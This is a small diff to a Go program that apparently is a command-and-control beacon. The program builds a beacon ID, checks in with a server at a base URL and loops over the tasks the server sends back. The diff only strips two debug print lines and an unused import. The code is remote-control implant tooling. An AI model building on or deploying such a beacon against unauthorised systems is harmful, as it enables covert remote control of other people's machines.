@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
 	"os"
 	"os/user"
 	"reflect"
@@ -59,7 +58,6 @@ var exit_process = false
 var function_mapping = Mapping.FunctionMapping()
 
 func main() {
-	fmt.Println(public_key_string)
 	// Generate global beacon_id and start beaconin process (same thread)
 	beacon_id = Modules.GenerateID(beacon_username)
 	StartBeacon()
@@ -79,7 +77,6 @@ func StartPulse() {
 	pulse_result := Networking.SendPulse(BeaconData(), base_url, public_key_string)
 	response_type := reflect.TypeOf(pulse_result).String()
 	if response_type == "[]interface {}" {
-		fmt.Println("k")
 		task_list := pulse_result.([]interface{})
 		for _, task := range task_list {
 			task_mapping := task.(map[string]interface{})
